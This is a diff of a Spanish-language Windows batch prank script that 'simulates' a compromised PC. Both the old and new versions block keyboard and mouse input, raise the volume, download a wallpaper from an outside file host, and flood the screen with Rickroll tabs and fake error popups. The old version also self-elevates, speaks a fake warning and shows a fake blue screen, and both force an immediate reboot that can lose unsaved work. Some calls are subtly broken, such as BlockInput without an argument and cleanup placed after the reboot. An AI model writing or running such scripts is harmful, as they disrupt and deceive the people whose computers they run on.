@@ -1,70 +1,64 @@
 @echo off
-title SYSTEM CRITICAL ERROR
-setlocal enabledelayedexpansion
+echo INICIANDO CAOS ABSOLUTO CON REINICIO FINAL AJJAJAJAJAJ
 
-:: ---------------------------------------------------------
-:: 1. ELEVACIÓN DE PRIVILEGIOS (Para bloquear teclado/ratón)
-:: ---------------------------------------------------------
-openfiles >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
+:: Bloquear teclado y ratón temporalmente
+echo Bloqueando controles...
+rundll32.exe user32.dll,BlockInput
 
-:: ---------------------------------------------------------
-:: 2. BLOQUEO TOTAL Y VOLUMEN AL MÁXIMO
-:: ---------------------------------------------------------
-echo Preparando sistema...
-:: Bloquea teclado y ratón
-rundll32.exe user32.dll,BlockInput 1
-
-:: Sube el volumen a 100 con un bucle rápido de PowerShell
-powershell -c "$w=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"
-
-:: ---------------------------------------------------------
-:: 3. FONDO CHAMOI Y VOZ DEL SISTEMA
-:: ---------------------------------------------------------
-:: Descargar y aplicar fondo
-powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/e9uh10.jpg' -OutFile '%temp%\c.jpg'"
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\c.jpg" /f
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
-rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-
-:: Voz de advertencia
-echo Set s = CreateObject("SAPI.SpVoice") > %temp%\v.vbs
-echo s.Speak "Critical error. Your computer has been compromised by Chamoi. Absolute chaos initiated." >> %temp%\v.vbs
-start wscript %temp%\v.vbs
-
-:: ---------------------------------------------------------
-:: 4. BOMBARDEO DE VENTANAS (RICKROLL Y CAOS)
-:: ---------------------------------------------------------
-echo Lanzando ataque masivo...
+:: Volumen al MÁXIMO
+echo VOLUMEN AL MÁXIMO...
 for /L %%i in (1,1,15) do (
-    start "" "https://youtu.be/f_WuRfuMXQw?autoplay=1"
-    start calc
-    start notepad
-    echo msgbox "ERROR CRITICO EN SECTOR %%i", 16, "SISTEMA INFECTADO" > %temp%\m%%i.vbs
-    start wscript %temp%\m%%i.vbs
+    powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"
 )
 
-:: ---------------------------------------------------------
-:: 5. EL PANTALLAZO AZUL (BSOD FALSO)
-:: ---------------------------------------------------------
-:: Crea una ventana azul que tapa TODA la pantalla
-echo Generando pantalla de la muerte...
-start /min powershell -WindowStyle Hidden -Command "& {Add-Type -AssemblyName System.Windows.Forms; $f = New-Object System.Windows.Forms.Form; $f.BackColor = 'Blue'; $f.WindowState = 'Maximized'; $f.FormBorderStyle = 'None'; $f.TopMost = $true; $l = New-Object System.Windows.Forms.Label; $l.Text = ':(' + [char]10 + [char]10 + 'Your PC ran into a problem and needs to restart. We''re just collecting some error info, and then we''ll restart for you.'; $l.ForeColor = 'White'; $l.Font = New-Object System.Drawing.Font('Segoe UI', 25); $l.AutoSize = $true; $l.Top = 150; $l.Left = 100; $f.Controls.Add($l); $f.ShowDialog()}"
+:: Fondo CHAMOI
+echo APLICANDO FONDO CHAMOI...
+powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/e9uh10.jpg' -OutFile '%temp%\chamoi.jpg'"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\chamoi.jpg" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
+rundll32.exe user32.dll,UpdatePerUserSystemParameters
 
-:: ---------------------------------------------------------
-:: 6. CUENTA REGRESIVA Y REINICIO
-:: ---------------------------------------------------------
-:: Espera 8 segundos para que el usuario entre en pánico viendo el azul
+:: 30 VENTANAS DE RICKROLL
+echo LANZANDO 30 RICKROLLS...
+for /L %%i in (1,1,30) do (
+    start "" "https://youtu.be/f_WuRfuMXQw?si=a-ZHHZuWollALawa"
+    timeout /t 1 /nobreak >nul
+)
+
+:: 50 VENTANAS EMERGENTES AUTOMÁTICAS
+echo BOMBARDEO DE 50 VENTANAS...
+for /L %%i in (1,1,50) do (
+    echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\caos%%i.vbs
+    echo oWS.Popup "CAOS NIVEL %%i/50 - RICKROLL ETERNO! 😈", 2, "APOCALIPSIS", 16 >> %temp%\caos%%i.vbs
+    start wscript %temp%\caos%%i.vbs
+)
+
+:: Abrir aplicaciones aleatorias del sistema
+echo ABRIENDO APLICACIONES DEL SISTEMA...
+start notepad
+start calc
+start mspaint
+start cmd
+start powershell
+
+:: Desbloquear controles después de 8 segundos
 timeout /t 8 /nobreak >nul
+rundll32.exe user32.dll,BlockInput
 
-:: Desbloquea entrada justo antes del final (opcional, para dar falsas esperanzas)
-rundll32.exe user32.dll,BlockInput 0
+:: Mensaje final de REINICIO
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\reinicio.vbs
+echo oWS.Popup "¡CAOS COMPLETADO! REINICIANDO EN 5 SEGUNDOS... 😈", 5, "REINICIO INMINENTE", 48 >> %temp%\reinicio.vbs
+start wscript %temp%\reinicio.vbs
 
-:: Limpieza rápida de archivos VBS creados
-del %temp%\*.vbs
+echo.
+echo ¡ULTIMO AVISO! REINICIANDO EN 5 SEGUNDOS...
+echo ESTE ES EL FINAL... 🔥
+timeout /t 5 /nobreak >nul
 
-:: Reinicio forzoso instantáneo
+:: REINICIAR LA PC
+echo REINICIANDO SISTEMA...
 shutdown /r /t 0 /f
+
+:: Limpiar (aunque ya se reiniciará)
+del %temp%\caos*.vbs
+del %temp%\reinicio.vbs
